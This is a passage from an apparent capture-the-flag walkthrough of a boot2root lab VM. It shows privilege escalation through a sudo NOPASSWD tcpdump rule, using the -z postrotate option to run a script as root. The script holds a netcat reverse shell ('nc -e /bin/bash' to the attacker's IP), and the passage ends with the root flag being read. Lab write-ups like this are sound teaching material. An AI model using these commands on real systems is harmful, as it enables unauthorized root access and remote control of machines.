-rw-------  1 fireman fireman 2151 Jun  7 22:33 .bash_history
-rw-r--r--  1 fireman fireman   18 Mar 15 09:56 .bash_logout
-rw-r--r--  1 fireman fireman  193 Mar 15 09:56 .bash_profile
-rw-r--r--  1 fireman fireman  231 Mar 15 09:56 .bashrc
drwx------  3 fireman fireman 4096 Jun  3 01:12 .config
-rw-------  1 fireman fireman   16 Jun  3 01:12 .esd_auth
drwxr-xr-x  4 fireman fireman 4096 Apr 25 02:33 .mozilla
drwxrwxr-x  2 fireman fireman 4096 Jun  3 01:55 .shadowsocks
drwx------  2 fireman fireman 4096 Jun  2 22:39 .ssh
{% endhighlight %}

Now as a part of my regular privilage escalation enumeration, using `sudo -l` I've found these 3 commands that we can run as a root. 

{% highlight bash %}
[fireman@localhost ~]$ sudo -l
sudo -l
Matching Defaults entries for fireman on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
{% endhighlight %}

After doing a bit of research I came across this [article](http://seclists.org/tcpdump/2010/q3/68
), showing us how we can execute a command using a `tcpdump` tool. Firstly, I add only simple `id` command in order to check whether or not will this technique work. 

{% highlight bash %}
[fireman@localhost ~]$ touch /tmp/exploit
touch /tmp/exploit
[fireman@localhost ~]$ chmod +x /tmp/exploit
chmod +x /tmp/exploit
[fireman@localhost ~]$ echo "id" > /tmp/exploit
echo "id" > /tmp/exploit
{% endhighlight %}

Now We can execute it and see the results. 

{% highlight bash %}
[fireman@localhost ~]$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
<eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
10 packets received by filter
0 packets dropped by kernel
[fireman@localhost ~]$ uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

Now we can use it to make another reverse shell (simply calling `/bin/bash` didn't work). 

{% highlight bash %}
[fireman@localhost ~]$ echo "nc -e /bin/bash 10.0.0.4 6666" > /tmp/exploit
echo "nc -e /bin/bash 10.0.0.4 6666" > /tmp/exploit
[fireman@localhost ~]$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
<eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
9 packets received by filter
0 packets dropped by kernel
{% endhighlight %}

And to the flag, here we go!

{% highlight bash %}
root@kali:~# nc -lvp 6666
listening on [any] 6666 ...
10.0.0.5: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.5] 51622
python -c 'import pty;pty.spawn("/bin/bash")'
[root@localhost fireman]# cd /root
cd /root
[root@localhost ~]# ls -la
ls -la
total 84
dr-xr-x---. 10 root root  4096 Jun  7 23:12 .
dr-xr-xr-x. 18 root root  4096 May 30 18:43 ..
-rw-------   1 root root   130 Jun  7 23:21 .bash_history
-rw-r--r--.  1 root root    18 Feb  9 09:26 .bash_logout
-rw-r--r--.  1 root root   176 Feb  9 09:26 .bash_profile
-rw-r--r--.  1 root root   176 Feb  9 09:26 .bashrc
drwx------.  3 root root  4096 Jun  1 21:01 .cache
drwxrwx---.  4 root root  4096 May 30 10:42 .config
-rw-r--r--.  1 root root   100 Feb  9 09:26 .cshrc
drwx------.  3 root root  4096 May 30 11:21 .dbus
-rw-------.  1 root root    16 May 30 10:42 .esd_auth
-rw-r--r--   1 root root  1993 Jun  7 23:16 flag.txt
-rw-r--r--   1 root root 12288 Jun  3 18:18 .flag.txt.swp
drwxr-xr-x   4 root root  4096 Jun  3 01:39 .forever
-rw-------   1 root root  1389 Jun  2 19:47 .mysql_history
drwxr-xr-x.  5 1000 1000  4096 May 30 17:37 .npm
drwxr-----.  3 root root  4096 May 30 11:38 .pki
drwxr-xr-x   2 root root  4096 Jun  1 23:29 .shadowsocks
drwx------   2 root root  4096 Jun  7 22:33 .ssh
-rw-------.  1 root root     0 May 30 11:21 .Xauthority
[root@localhost ~]# cat flag.txt
cat flag.txt
[+] You're a soldier. 
[+] One of the best that the world could set against
[+] the demonic invasion.  

+-----------------------------------------------------------------------------+
| |       |\                                           -~ /     \  /          |
|~~__     | \                                         | \/       /\          /|
|    --   |  \                                        | / \    /    \     /   |
|      |~_|   \                                   \___|/    \/         /      |
|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
|  __--P :  |  /                                /  /  | \     /  \          /\|
|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
|    |      |/                        .-.             |  /\          \  /     |
|    |      /                        |   |            |/   \          /\      |
|    |     /                        |     |            -_   \       /    \    |
+-----------------------------------------------------------------------------+
|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
+-----------------------------------------------------------------------------+
			
		FLAG: kre0cu4jl4rzjicpo1i7z5l1     

[+] Congratulations on completing this VM & I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther
{% endhighlight %}

